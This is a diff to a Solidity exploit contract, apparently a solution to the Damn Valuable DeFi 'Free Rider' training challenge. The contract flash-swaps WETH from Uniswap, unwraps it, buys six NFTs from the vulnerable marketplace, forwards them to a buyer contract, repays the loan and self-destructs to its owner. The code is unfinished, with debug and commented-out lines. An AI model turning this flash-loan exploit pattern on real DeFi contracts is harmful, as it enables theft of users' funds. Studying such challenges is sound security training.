@@ -12,7 +12,11 @@ import "hardhat/console.sol";
 import "../DamnValuableToken.sol";
 
 
-
+interface IWETH {
+    function deposit() external payable;
+    function transfer(address to, uint value) external returns (bool);
+    function withdraw(uint) external;
+}
 
 /**
  * @title FreeRiderNFTMarketplace
@@ -105,6 +109,7 @@ contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
     address payable immutable weth;
     address immutable factory;
     address immutable dvt;
+    address owner;
 
     constructor (address payable _wethAddr, address _factoryAddr, address _dvtAddr, 
                 address payable _marketPlaceAddr, address _freeRiderBuyerAddr, address _nftAddr) {
@@ -114,14 +119,15 @@ contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
         weth=_wethAddr;
         factory=_factoryAddr;
         dvnft = DamnValuableNFT(_nftAddr);
+        owner = msg.sender;
     }
 
-    function flashLoanAttack(address _tokenToBorrow, uint256 _amount,address _pair)external{ //do a flash loan on the uniswap v2 (paying back with the  callback)
+    function flashLoanAttack(address _tokenToBorrow, uint256 _nftPrice,address _pair)external{ //do a flash loan on the uniswap v2 (paying back with the  callback)
 
         //address pair = IUniswapV2Factory(factory).getPair(_tokenToBorrow, address(dvt));
         //address pair = IUniswapV2Factory(factory).createPair(_tokenToBorrow, address(dvnft));
 
-	console.log("Token to borrow: ",_tokenToBorrow);
+/*	console.log("Token to borrow: ",_tokenToBorrow);
  	console.log("DV NFT address: ",address(dvnft));
        address pair = IUniswapV2Factory(factory).getPair(_tokenToBorrow, address(dvnft));
 
@@ -135,12 +141,12 @@ contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
  
         uint256 amount0Out = _tokenToBorrow == token0 ? _amount : 0;
         uint256 amount1Out = _tokenToBorrow == token1 ? _amount : 0;
-
-        bytes memory data = abi.encode(_tokenToBorrow, _amount);
+*/
+        bytes memory data = abi.encode(IUniswapV2Pair(_pair).token0() , _nftPrice);
 
         // using uniswap for a flashloal (rapid swap)
         //IUniswapV2Factory(pair).swap(amount0Out,amount1Out,address(this),data);
-	IUniswapV2Pair(_pair).swap(amount0Out,amount1Out,address(this),data);
+	IUniswapV2Pair(_pair).swap(_nftPrice,0,address(this),data);
 
     }
 
@@ -173,12 +179,17 @@ function swapEth(address router, address _tokenIn, address _tokenOut, uint _amou
         //uint256 currentBalance = IERC20(tokenToBorrow).balanceOf(address(this));
         uint256 currentBalance = IERC20(tokenToBorrow).balanceOf(address(this));
 
+
 	console.log("Current Balance of Token belongin to this address: ", currentBalance);
 	console.log("Current Balance of Ethers to this address: ", address(this).balance);
 
 //        tokenToBorrow.functionCall(abi.encodeWithSignature("withdraw(uint256)", currentBalance));
 //        DamnValuableToken(tokenToBorrow).withdraw(currentBalance);
-        DamnValuableToken(tokenToBorrow).transfer(address(this),currentBalance);
+       // DamnValuableToken(tokenToBorrow).transfer(address(this),currentBalance);
+	IWETH localWeth = IWETH(tokenToBorrow);
+	localWeth.withdraw(amount);
+	//weth.withdraw(amount);
+
 
         uint256[] memory nftIds = new uint256[](6);
         for(uint256 i = 0; i<6;i++){
@@ -190,16 +201,22 @@ function swapEth(address router, address _tokenIn, address _tokenOut, uint _amou
         for(uint256 i = 0;i<6;i++){
             //dvnft.safeTransferFrom(address(this),freeRiderBuyer, i);
             //DamnValuableNFT(dvnft).safeTransferFrom(address(this),freeRiderBuyer, i);
-            dvnft.transferFrom(address(this),address(freeRiderBuyer), i);
+            //dvnft.transferFrom(address(this),address(freeRiderBuyer), i);
             //dvnft.safeTransferFrom(address(this),freeRiderBuyer, i,"");
+	      dvnft.safeTransferFrom(address(this),address(freeRiderBuyer), i);
+//	      dvnft.safeTransferFrom(address(this),owner, i);
+
         }
 
         //Paying back
         //(bool success) = weth.call{value: 15.1 ether}("");
-        weth.call{value: 15.1 ether}("");
+        //weth.call{value: 15.1 ether}("");
+	localWeth.deposit{value: amountToRepay}();
+	//weth.deposit{value: amountToRepay}();
 
         //             _govAddr.call{value: 1 ether}(""); 
         IERC20(tokenToBorrow).transfer(pair, amountToRepay);
+	selfdestruct(payable(owner));
     }
 
     function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data ) external override pure returns (bytes4){
